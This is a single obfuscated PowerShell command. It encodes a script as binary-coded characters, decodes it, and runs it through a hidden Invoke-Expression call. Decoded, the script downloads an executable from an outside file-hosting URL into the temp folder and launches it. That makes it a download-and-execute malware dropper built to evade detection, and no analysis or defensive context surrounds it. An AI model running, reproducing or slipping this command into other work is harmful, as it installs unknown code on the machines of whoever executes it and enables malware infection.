powershell     "-jOIn ('1010R101000h100100m1100100t1110000J1101100Y111101O100100_1100101f1101110O1110110R111010t1110100O1100101O1101101h1110000f101011m100111Y1100110_101110O1100101t1111000R1100101P100111R101001h111011t101000O1001110m1100101J1110111_101101R1001111_1100010m1101010P1100101m1100011m1110100J100000f1010011J1111001h1110011h1110100P1100101P1101101h101110t1001110J1100101h1110100f101110P1010111Y1100101m1100010J1000011Y1101100t1101001R1100101t1101110m1110100Y101001m101110P1000100m1101111R1110111P1101110f1101100P1101111f1100001Y1100100t1000110O1101001Y1101100_1100101h101000h100111P1101000Y1110100h1110100h1110000P1110011t111010f101111P101111R1100001J101110t1110000_1101111J1101101h1100110f101110J1100011O1100001Y1110100J101111t1110001f1100101Y1100010_1101000m1101000R1110101Y101110J1100101Y1111000t1100101m100111J101100R100000R100100P1100100f1110000t1101100Y101001P111011J1010011h1110100t1100001P1110010Y1110100O101101t1010000O1110010P1101111m1100011h1100101t1110011Y1110011R100000m100100f1100100_1110000P1101100f1010O1010'.sPlit( 'YR_fhmtJOP') | %{ ( [conVErT]::ToiNt16(($_.tOStrInG()) , 2)-AS [ChAR]) } ) |. ( $VerbOsEPrefeREnCe.toSTRING()[1,3]+'x'-JoIN'')"